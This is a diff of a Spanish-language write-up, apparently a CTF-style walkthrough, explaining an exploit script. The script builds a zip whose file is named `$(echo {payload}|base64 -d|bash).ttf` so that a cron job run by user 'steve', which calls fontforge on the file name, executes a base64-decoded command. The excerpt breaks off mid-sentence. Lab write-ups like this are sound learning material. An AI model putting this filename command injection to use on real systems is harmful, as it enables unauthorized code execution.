@@ -215,9 +215,11 @@ exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf" with zipfile.ZipFile(
 print("exploit.zip created!")
 ```
 
-En este se hacen los siguientes pasos:
-- *`exploit_filename`* -> Crea el fichero `.zip` con nombre malicioso, este funciona por que en la tarea cron de `steve` se ejecuta 
+En este se hace el siguiente paso:
+- *`exploit_filename`* -> Crea el fichero `.zip` con nombre malicioso, este funciona por que en la tarea cron de `steve` se ejecuta
 ```python
 	fontforge -c "fontforge.open('$file')"
 ```
+  Cuando `$file` es `$(echo ...|base64 -d|bash).ttf`, el shell ejecuta primero lo que está dentro de `$()` antes de pasarlo a fontforge.
 
+Una vez lo tenemos listo, ejecutamos el script y el ``
